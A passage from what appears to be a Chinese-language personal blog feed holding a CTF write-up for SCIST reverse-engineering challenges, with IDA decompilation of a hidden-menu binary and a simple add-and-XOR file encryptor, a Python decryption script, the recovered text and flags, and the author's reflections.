class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rax</span><br><span class="line">mov     rdx, rsi</span><br><span class="line">movsxd  rsi, edi</span><br><span class="line">lea     rdi, _ZN6peekme4main17h8f1a22c22fe4af78E ; peekme::main::h8f1a22c22fe4af78</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">call    _ZN3std2rt10lang_start17h04c8c41c32fd9fd3E ; std::rt::lang_start::h04c8c41c32fd9fd3</span><br><span class="line">pop     rcx</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at A550</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>接著用 IDA 的 Decompile 功能把他反編譯後，會得到看得懂的代碼。接著對著<code>return std::rt::lang_start::h04c8c41c32fd9fd3(peekme::main::h8f1a22c22fe4af78, argc, argv, 0LL);</code>裡面的<code>main</code>點兩下，進到<code>main</code>函數中看看他的代碼。（我也不太確定這是甚麼語言，ChatGPT 說是 C++，信他一把。反正不是很重要，能看懂就行）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall peekme::main::<span class="built_in">h8f1a22c22fe4af78</span>()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">24</span>]; <span class="comment">// [rsp+38h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-128h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+60h] [rbp-118h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+68h] [rbp-110h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">48</span>]; <span class="comment">// [rsp+70h] [rbp-108h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">48</span>]; <span class="comment">// [rsp+A0h] [rbp-D8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">48</span>]; <span class="comment">// [rsp+D0h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">48</span>]; <span class="comment">// [rsp+100h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">64</span>]; <span class="comment">// [rsp+130h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+170h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      peekme::print_menu::<span class="built_in">hfa5f59ad859dee03</span>();</span><br><span class="line">      alloc::string::String::<span class="keyword">new</span>::<span class="built_in">hf9d068018f009bc3</span>(v6);</span><br><span class="line">      std::io::stdio::stdin::<span class="built_in">h89cff74eb89d9610</span>();</span><br><span class="line">      v8 = v0;</span><br><span class="line">      std::io::stdio::Stdin::read_line::<span class="built_in">hbc05ff0cbbf71c20</span>();</span><br><span class="line">      core::ptr::drop_in_place$LT$core..result..Result$LT$usize$C$std..io..error..Error$GT$$GT$::<span class="built_in">h26378bc0e070a403</span>(</span><br><span class="line">        v7,</span><br><span class="line">        &amp;v8);</span><br><span class="line">      v1 = _$LT$alloc..string..String$u20$as$u20$core..ops..deref..Deref$GT$::deref::<span class="built_in">hb7507d927317f778</span>(v6);</span><br><span class="line">      v3 = core::str::_$LT$impl$u20$str$GT$::trim::<span class="built_in">h83e8a696fa2aacc0</span>(v1, v2);</span><br><span class="line">      v15 = core::str::_$LT$impl$u20$str$GT$::parse::<span class="built_in">h02bdf3cbed74437f</span>(v3, v4);</span><br><span class="line">      v9 = v15;</span><br><span class="line">      <span class="keyword">if</span> ( (v15 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      core::fmt::Arguments::new_const::<span class="built_in">h2579e8f805344237</span>(v14, &amp;off_58380, <span class="number">1LL</span>);</span><br><span class="line">      std::io::stdio::_print::<span class="built_in">h599d580b15036a4c</span>();</span><br><span class="line">      core::ptr::drop_in_place$LT$alloc..string..String$GT$::<span class="built_in">h40c43e23f371b83b</span>(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">HIDWORD</span>(v9) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      core::fmt::Arguments::new_const::<span class="built_in">h2579e8f805344237</span>(v10, &amp;off_58350, <span class="number">1LL</span>);</span><br><span class="line">      std::io::stdio::_print::<span class="built_in">h599d580b15036a4c</span>();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">HIDWORD</span>(v9) != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    core::fmt::Arguments::new_const::<span class="built_in">h2579e8f805344237</span>(v11, &amp;off_58360, <span class="number">1LL</span>);</span><br><span class="line">    std::io::stdio::_print::<span class="built_in">h599d580b15036a4c</span>();</span><br><span class="line">LABEL_12:</span><br><span class="line">    core::ptr::drop_in_place$LT$alloc..string..String$GT$::<span class="built_in">h40c43e23f371b83b</span>(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">HIDWORD</span>(v9) == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> core::ptr::drop_in_place$LT$alloc..string..String$GT$::<span class="built_in">h40c43e23f371b83b</span>(v6);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">HIDWORD</span>(v9) != <span class="number">333666999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    core::fmt::Arguments::new_const::<span class="built_in">h2579e8f805344237</span>(v13, &amp;off_58380, <span class="number">1LL</span>);</span><br><span class="line">    std::io::stdio::_print::<span class="built_in">h599d580b15036a4c</span>();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  core::fmt::Arguments::new_const::<span class="built_in">h2579e8f805344237</span>(v12, &amp;off_58370, <span class="number">1LL</span>);</span><br><span class="line">  std::io::stdio::_print::<span class="built_in">h599d580b15036a4c</span>();</span><br><span class="line">  <span class="keyword">return</span> core::ptr::drop_in_place$LT$alloc..string..String$GT$::<span class="built_in">h40c43e23f371b83b</span>(v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在第 56 行的部分，也就是<code>if ( HIDWORD(v9) != 333666999 )</code>的地方，出現了不尋常的選項。前面都是正常的 1~3 的選項，這個 333666999 就看起來很詭異。於是我們<code>./peekme</code>，並且輸入<code>333666999</code>。果然，就找到 Flag 了！</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCIST&#123;h0w_diD_y0u_f1nd_m3!&#125;</span><br></pre></td></tr></table></figure><h2 id="TinyEncryptor">TinyEncryptor</h2><p>這題的話，直接執行會發現甚麼東西都沒有，看起來就像是甚麼都沒發生一樣。同時這題題目叫做 TinyEncryptor，並還給了一個<code>encrypted.txt</code>，如下。（雖然放了也都是亂碼但還是放一下 XD）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">������̈������������탈�݈ˈ���������ӈ��������̈��̈�������̈�ӈ��ψ������̈��������������؆������ψ���ǈ�݈����ƈ���ǈ��ψ����̈�Έ������̈������݈��̈��݈ˈ����������̈�����������܈�݈�������܈���ǈ��ψ����̈�Έ�����������Ĉ�������������������������̈�������������ψ�������ڈ���Ĉ�����������ӈ�����ψ�ƈ�������̈���݄���̈����ψ��������݈���Ĉ�ψ�������̈�ӈ�������ڈ�������ψ��̈�������φ�����������������݈�������ڈ�݈�������̈�ӈ����������ψ�������ψ�����ˈ�����ψ���������ƈ��ӈ���܈�݈�����������ψ�و��ψ���܈�Έ��ψ�����ǈ��̈��ψ����چ�����݈������������Ĉ�݈��ψ�������ψ�݈��܈���ӈ������̈��ڈ��݈����ڄ���܈���و������܈��݈����ڄ�����������������݈�Έ��ψ���������ӈ���ψ���ψ�������ψ�������܈������̈�������ƈ�و�����ψ�܈�݈�����������݈��������������������̈������ƈ��������ӈ�������݈�و��ψ����ψ�����݈���ƈ�����������و��ψ���������ӆ��������������̈�������������������݈������݈������������Ĉ���ˈ����������Ƅ������ψ���������ψ�������ӈ�����������̈�������܈�����������݈������������������ψ���܈��ψ���������ӈ���Ĉ���ψ��������݈����ڄ����݈����ψ�و������݈��̈������τ���̈���݈���ψ�������ψ���ǈ�ƈ��̇���ڈ����������φ����ӈ���و����ψ���܈������̈�������������Ĉ����ш��������݈��̈������݈�و����ڈ�������̈�������ڈ�������ӈ���ڈ���܈�������݈��������ӈ��������φ���������݈����ƈ����ψ���܈���݈���������ӈ���Ĉ�ψ���̈��������ӈ�و������ψ������Ĉ�����݈���������܈�������݈�������̈�����������݈�و��ψ����ڃ���̈��܈�و�������ψ�������ڈ�������ӆ��������J(&quot;��J(&quot;�����؈������������݈����Ĉ��̈��섈�������ψ������������݈������݈�����̈���Ą���̈���������������ǈ��������݈������݈��������܈������ψ������̈�����������ƈ����ڈ�������݈�Έ������̆�����������ψ��������ӈ�������݈���܈����ӈ��ш���܈��������݈����݈�����ˈ������̈�������ǈ�����ψ���烆����������݈�Έ���ӈ����������و���݈��������ӈ��ψ�����ψ�����̈�����݈���������܈�Έ������φ��������ӈ�������ݢ������̈��������������������݈��Ј��ӈ���������ӈ�������݄��Έ��������Ĉ��ψ�������̈��ڈˈ����ӈ������̈�����Ǆ����܈�݄�ˈ�����ǈ��������܈�و��ψ����������������ݒ������������܈��Ӣ�����ψ����܈��̈�����ܢ�����ӈ���������������������̈��������Ƣ�����̈������Ϣ�����ψ����������Ƣ������̈����̈����ӈ����������������܈��Ӣ��ψ����������܈��ӈ�݈ˈ�������܈��������͈��̈������ψ��ӈ���ڈ���܈�݈������̈�������ӈ�ƈ��ψ���؈�܈����������ψ���ψ��̈�����܈�ψ������̆���ψ������ψ��ӈ����ڈ�����݈��ψ���؄�����ψ��ψ�����͈��ӈ�݈���̈��ڈ����������ƈ��̈��ڈ���������ƈ�Έ��������ψ���ˈ���܈�و��ψ���؄��݈�����݈���������ψ����������������؈������̆���������݈��ӈ�݈���̈�و����ш��ψ��������ƈ�Έ�����ψ�����������ݒ�����ӈ������̈�������ǈ�����ψ���烈�݈�������̈�و�ψ���ψ�و���ƈˈ�����ǈ�����ڈ��ƈ����ڈ�و����ш��ψ����ڈ�و���ш���܈�ψ��݈ˈ������ψ������̈�������ڃ��������ˈ���������ڈ�������Ĉ������̈�ӈ��ψ������̈��������������؈���ψ�����܈��������݈����������ƈ�������ă��ƈ����ڈ�و�����ψ��݈���������ψ�Έ��ψ����������̈��̈�و����ψ��݈�������ӕ����݈����݈�܈���������ψ��ڈˈ�������ψ����������ڈ������ƈ��������̈����������܈��ӈ���ڈ������τ�ˈ���·��������̈��σ��و����܈ˈ�����ψ����������ƈ�����ˈ������̈�����ӆ���ψ��������̈�����������������̈�و���ψ��ψ���������ƈ�Έ���݈��ӈ�ӈ�������ψ�������݈���̄���܈�����ڈ���������ψ�݈��܈ˈ�����������������܆�������ӈ����������������ӈ�����������������݈�����ƈ�����ӈ���������ƈ���������݈�و������ψ���Ĉ��������ƈ�Έ��������ψ����݈�Έ������J(&lt;��ڈ������τ���������݈�����������������������͈���݆����ƈ��ψ���������������ǈ���݈��܈���ψ���Ĉ�����݈�و��������̈�����ӆ���ψ����܈�������������ƈ������݈��ψ�����ڈ�������͆�������̈������Ϣ�����̈������ψ�������݈������ψ����������ƈ�ӈ���������܈�و�������ǈ������������ƈ����������ƈ������������ψ�������ψ��̈�������ψ���������̆����݈����݈��ψ���ˈ��ƈ�ψ�������̈���ӈ�وˈ���������ڈ����������ƈ�Έ�������ψ��̈�������φ������̈������ψ��ƈ�ψ���̈��ڈ����������������ڈ������τ�����݈��و���؈ˈ������ƈ����ڈ�������ڈ���܈��݈��܈���ƈ�������̈�و�ψ�������̈���Ĉ��܈�ψ���ψ�و���ӈ�܆���������ӄ�ˈ���ڈ��ƈ�����ψ��ψ�����������ƈ�و�܄���̈���̈�܈�و������ψ���τ����ӈ�܈�ƈ��ψ�������ψ�Έ����ڈ�����τ��ڈ���ň�܈�؈���̈�ƈ���ψ����݄���ψ������������ƈ�������ψ�و������܈�܃��������������ӄ���ψ���ڈ��ӈ��ψ�������ψ�و�����ӈ��ψ���������������ǁ݈����������݈�و���ψ�܈���ň��ψ��������ˈ���τ���ӄ�ˈ��������ӈ������ψ��݈�������̆������������̈������τ���ψ������݈�������ӈ��������̈������ˈ��ӈ����̈�و��ψ������̈�������ǈ�����ψ�و���܈���ӈ��ψ���������̈��̈���������̈����͈�����ڈ�ƈ��݈�ڈ��ڈ�������ڈ��ƈ���ӈ�܆��ƈ���݈��������������τ����݈����܈���و������܈�����ψ���ǈ�����������و��ψ���������ڈ�������ˈ��ш�������ڄ��ڈ��������������݈�Έ����ڈ������܈��τ������܈����ڈ�������܈���������ƈ�Έ��ψ�����ڈ�Έ��ψ������������ψ����������Ƣ�����ψ����������ƈ�����݈������݈�و��ψ���ځ݈�������ڈ�و�ψ�������̈�ӈ���������̈������݆���ڈ������τ��������ψ��������݈��ƈ�������ӈ�����������̈������݈�و�������τ���������������݈��������������ڈ�������ψ�و���������܈���������Ĉ������Ĉ�����݈�����������݆��܈����݈�ӈ���������ψ�������ψ�������ψˈ����������ψ�����������܈�������ψ�݈��������ӈ�����������ψ�������ڈ��ƈ���ƈ������܈���݈����������ψ�وˈ�����ψ����ӈ�و���ш���܈��������̈�������ψ�݈��������ӈ������������������݈�����ψ����������ƈ������݈���ψ���ƈ�������̈��ڈ������݈�������ڈ������������݄���������������Ą������������������̈��������������ψ����������ƈ�݈������ӈ�������̈����������͇��ӈ���������ƈ�و���܈��ψ����������ƈ���܈��ƈ���ӈ�ψ���̈�ӈ��ψ�������݈���܈��������̈��ψ����������Ƅ���̈��܈�ӈ�ƈ�����������چ���و���ψ��ψ�����������ψ����Ƅ���ψ���ځ݈����͈�����ڈ�������ψ����̈���̈��ψ������و����ڈ�������݄���܈���ӈ�Έ���ӈ����̈�����܈���܈���ӈ���ψ���������ƈ���������̈���ӈ�Έ��ψ����͈�����ڈ�������φ��������̈�������ψ����ڈ�����������݄����݈�������݈ˈ���ψ���������̈�������ڈ��ψ����͒���������̈����������݈��ψ���ڈ���ǈ�����������܈�݈�܈�݈����������̈�و��ψ����و��������Ǆ������ӈ���������������݈�܈���ǈ�����������̈�و������ڈ���ň����݈�݈�܈�݈�����������̈�Ƅ������̈������ψ�������݈�����������̈�����݈�و�܈���ƈ����̈�و��ψ���̈����τ���̈�����ψ����������ƈ�������݈�����������̈�������ψ���ǈ������������ψ��������ƈ���ƈ�܈�݈���̈�ƈ����ڈ��������݆��و�������ψ��ψ������ӈ�Έ����������ƈ���������݄������܈��������݈����������ƈ��݈���ƈ�������̈�݈ˈ�������Ƅ����������݈ˈ����؈��������ψ�����ψ�و������܈������������ψ�������ӈ�Έ���������Ĉ������݆������Έ�Έ����ψ���������ψ���ƈ�������̈�و�ψ���̈��ڈ������ψ��������Ƅ��ӈ������������������ڈ��ψ䛈����ψ�Έˈ��������ڈ�݈����ӈ�φ������݈�����������ψ�و�������ψ��ψ������ψ������ψ������܈����ψ�����݃��ڈ�������݈ˈ������ψ���܈�������̈������������̆�������������ρ݈���ڈ�������������ڝ���ܝ�������ؑ��Ƌ�</span><br></pre></td></tr></table></figure><p>應該是個加密腳本，所以我們直接分析他的 Binary，IDA 啟動！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  FILE *v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  v6 = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  stream = fopen(<span class="string">&quot;encrypted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = fgetc(v6);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = v5 + <span class="number">1</span>;</span><br><span class="line">    LOBYTE(v4) = v4 ^ <span class="number">0xA9</span>;</span><br><span class="line">    fputc(v4, stream);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(v6);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打開後發現，這就是一個 XOR 加密。具體工作流程是會對 Flag 的每一個字元的 ASCII 值逐個+1，之後和<code>0xA9</code>做 XOR，並寫入加密文件中加密文件中。下面是具體的流程圖。</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TDA[Start] --&gt; B[Read character from input file]B --&gt;|Not EOF| C[Add 1 to ASCII value of character]C --&gt; D[XOR with 0xA9]D --&gt; E[Write encrypted character to output file]E --&gt; BB --&gt;|EOF| F[Close input file]F --&gt; G[Close output file]G --&gt; H[End]  </pre></div><p>所以要解密我們就反著來就行，寫了一個解密腳本，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_character</span>(<span class="params">enc_char</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>((enc_char ^ <span class="number">0xA9</span>) - <span class="number">1</span>)  <span class="comment"># 將字元和0x49 做 XOR，然後 -1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> enc_file, <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            byte = enc_file.read(<span class="number">1</span>)  <span class="comment"># 以byte為單位讀取</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> byte:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            encrypted_char = bytes_to_long(byte)</span><br><span class="line">            decrypted_char = decrypt_character(encrypted_char)</span><br><span class="line">            dec_file.write(decrypted_char)</span><br><span class="line"></span><br><span class="line">decrypt_file(<span class="string">&quot;encrypted.txt&quot;</span>, <span class="string">&quot;decrypted.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p>之後查看 decrypted.txt，會看到以下的內容。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Trusted Computing (TC) is a technology developed and promoted by the Trusted Computing Group.[1] The term is taken from the field of trusted systems and has a specialized meaning that is distinct from the field of confidential computing.[2] With Trusted Computing, the computer will consistently behave in expected ways, and those behaviors will be enforced by computer hardware and software.[1] Enforcing this behavior is achieved by loading the hardware with a unique encryption key that is inaccessible to the rest of the system and the owner.</span><br><span class="line"></span><br><span class="line">TC is controversial as the hardware is not only secured for its owner, but also against its owner, leading opponents of the technology like free software activist Richard Stallman to deride it as &quot;treacherous computing&quot;,[3][4] and certain scholarly articles to use scare quotes when referring to the technology.[5][6]</span><br><span class="line"></span><br><span class="line">Trusted Computing proponents such as International Data Corporation,[7] the Enterprise Strategy Group[8] and Endpoint Technologies Associates[9] state that the technology will make computers safer, less prone to viruses and malware, and thus more reliable from an end-user perspective. They also state that Trusted Computing will allow computers and servers to offer improved computer security over that which is currently available. Opponents often state that this technology will be used primarily to enforce digital rights management policies (imposed restrictions to the owner) and not to increase computer security.[3][10]:â23â</span><br><span class="line"></span><br><span class="line">Chip manufacturers Intel and AMD, hardware manufacturers such as HP and Dell, and operating system providers such as Microsoft include Trusted Computing in their products if enabled.[11][12] The U.S. Army requires that every new PC it purchases comes with a Trusted Platform Module (TPM).[13][14] As of July 3, 2007, so does virtually the entire United States Department of Defense.[15]</span><br><span class="line"></span><br><span class="line">Key concepts</span><br><span class="line">Trusted Computing encompasses six key technology concepts, of which all are required for a fully Trusted system, that is, a system compliant to the TCG specifications:</span><br><span class="line"></span><br><span class="line">Endorsement key</span><br><span class="line">Secure input and output</span><br><span class="line">Memory curtaining / protected execution</span><br><span class="line">Sealed storage</span><br><span class="line">Remote attestation</span><br><span class="line">Trusted Third Party (TTP)</span><br><span class="line">Endorsement key</span><br><span class="line">The endorsement key is a 2048-bit RSA public and private key pair that is created randomly on the chip at manufacture time and cannot be changed. The private key never leaves the chip, while the public key is used for attestation and for encryption of sensitive data sent to the chip, as occurs during the TPM_TakeOwnership command.[16]</span><br><span class="line"></span><br><span class="line">This key is used to allow the execution of secure transactions: every Trusted Platform Module (TPM) is required to be able to sign a random number (in order to allow the owner to show that he has a genuine trusted computer), using a particular protocol created by the Trusted Computing Group (the direct anonymous attestation protocol) in order to ensure its compliance of the TCG standard and to prove its identity; this makes it impossible for a software TPM emulator with an untrusted endorsement key (for example, a self-generated one) to start a secure transaction with a trusted entity. The TPM should be[vague] designed to make the extraction of this key by hardware analysis hard, but tamper resistance is not a strong requirement.</span><br><span class="line"></span><br><span class="line">Memory curtaining</span><br><span class="line">Memory curtaining extends common memory protection techniques to provide full isolation of sensitive areas of memoryâfor example, locations containing cryptographic keys. Even the operating system does not have full access to curtained memory. The exact implementation details are vendor specific.</span><br><span class="line"></span><br><span class="line">Sealed storage</span><br><span class="line">Sealed storage protects private information by binding it to platform configuration information including the software and hardware being used. This means the data can be released only to a particular combination of software and hardware. Sealed storage can be used for DRM enforcing. For example, users who keep a song on their computer that has not been licensed to be listened will not be able to play it. Currently, a user can locate the song, listen to it, and send it to someone else, play it in the software of their choice, or back it up (and in some cases, use circumvention software to decrypt it). Alternatively, the user may use software to modify the operating system&#x27;s DRM routines to have it leak the song data once, say, a temporary license was acquired. Using sealed storage, the song is securely encrypted using a key bound to the trusted platform module so that only the unmodified and untampered music player on his or her computer can play it. In this DRM architecture, this might also prevent people from listening to the song after buying a new computer, or upgrading parts of their current one, except after explicit permission of the vendor of the song.</span><br><span class="line"></span><br><span class="line">Remote attestation</span><br><span class="line">Remote attestation allows changes to the user&#x27;s computer to be detected by authorized parties. For example, software companies can identify unauthorized changes to software, including users modifying their software to circumvent commercial digital rights restrictions. It works by having the hardware generate a certificate stating what software is currently running. The computer can then present this certificate to a remote party to show that unaltered software is currently executing. Numerous remote attestation schemes have been proposed for various computer architectures, including Intel,[17] RISC-V,[18] and ARM.[19]</span><br><span class="line"></span><br><span class="line">Remote attestation is usually combined with public-key encryption so that the information sent can only be read by the programs that requested the attestation, and not by an eavesdropper.</span><br><span class="line"></span><br><span class="line">To take the song example again, the user&#x27;s music player software could send the song to other machines, but only if they could attest that they were running an authorized copy of the music player software. Combined with the other technologies, this provides a more restricted path for the music: encrypted I/O prevents the user from recording it as it is transmitted to the audio subsystem, memory locking prevents it from being dumped to regular disk files as it is being worked on, sealed storage curtails unauthorized access to it when saved to the hard drive, and remote attestation prevents unauthorized software from accessing the song even when it is used on other computers. To preserve the privacy of attestation responders, Direct Anonymous Attestation has been proposed as a solution, which uses a group signature scheme to prevent revealing the identity of individual signers.</span><br><span class="line"></span><br><span class="line">Proof of space (PoS) have been proposed to be used for malware detection, by determining whether the L1 cache of a processor is empty (e.g., has enough space to evaluate the PoSpace routine without cache misses) or contains a routine that resisted being evicted.[20][21]</span><br><span class="line"></span><br><span class="line">Here&#x27;s your flag: SCIST&#123;br3ak_t3e_enCryp71on!&#125;</span><br></pre></td></tr></table></figure><p>Flag 就找到啦！</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCIST&#123;br3ak_t3e_enCryp71on!&#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-心得">0x04 心得</h1><p>這次的 Pwn 跟 Misc 幾乎都沒什麼進度，就不特別寫出來了。總結來說這次對自己的表現還是不是很滿意，沒有進步的感覺。雖然有多寫了些題目，但還沒感受到成效。不過沒事，下學期再去牛肉湯好好訓練一下，會盡量讓自己多參加比賽，也在比賽完後看看別人的 writeup 去把不會的題目搞懂。希望自己下次可以再進步一點，越來越好了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 10] 關於打完SCIST期末後決定增加難度這件事</title>
      <link href="/posts/5ed8ca9a/"/>
      <url>/posts/5ed8ca9a/</url>
      
